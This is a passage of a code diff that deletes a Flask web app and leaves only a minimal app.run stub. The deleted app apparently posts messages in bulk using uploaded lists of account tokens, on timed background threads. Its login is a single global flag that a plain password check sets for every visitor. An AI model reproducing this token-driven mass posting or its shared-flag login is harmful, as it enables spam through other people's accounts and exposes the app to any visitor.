-    except Exception as e:
-        logs[task_key].append(f"Exception: {e}")
-    logs[task_key].append("Task stopped.")
-
-# ==================== ROUTES ====================
-@app.route("/", methods=["GET","POST"])
-def index():
-    global owner_logged_in
-    if request.method=="POST":
-        if "owner_password" in request.form:
-            if request.form["owner_password"]==OWNER_PASSWORD:
-                owner_logged_in=True
-                return redirect(url_for("index"))
-        if "start_posting" in request.form:
-            tokens=[]
-            if request.form.get("token"):
-                tokens.append(request.form.get("token"))
-
-            if "token_file" in request.files:
-                f=request.files["token_file"]
-                if f.filename:
-                    tokens+=f.read().decode().splitlines()
-
-            messages=[]
-            if "post_file" in request.files:
-                f=request.files["post_file"]
-                if f.filename:
-                    messages+=f.read().decode().splitlines()
-
-            delay=int(request.form.get("delay",60))
-            task_key=str(int(time.time()))
-            tasks[task_key]=True
-            threading.Thread(target=auto_post,args=(task_key,tokens,messages,delay),daemon=True).start()
-            return redirect(url_for("index"))
-
-        if "stop_posting" in request.form:
-            stop_key=request.form["stop_key_input"]
-            if stop_key in tasks:
-                tasks.pop(stop_key)
-                logs[stop_key].append("Task stopped manually.")
-            return redirect(url_for("index"))
-
-    return render_template_string(HTML_PAGE, tasks=tasks, owner=owner_logged_in)
-
-@app.route("/logs")
-def get_logs():
-    key=request.args.get("current_key")
-    return jsonify({"logs": logs.get(key,[])})
-
-@app.route("/logout")
-def logout():
-    global owner_logged_in
-    owner_logged_in=False
-    return redirect(url_for("index"))
-
-# ==================== RUN ====================
-if __name__=="__main__":
-    port=int(os.environ.get("PORT",5000))
-    app.run(host="0.0.0.0", port=port)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
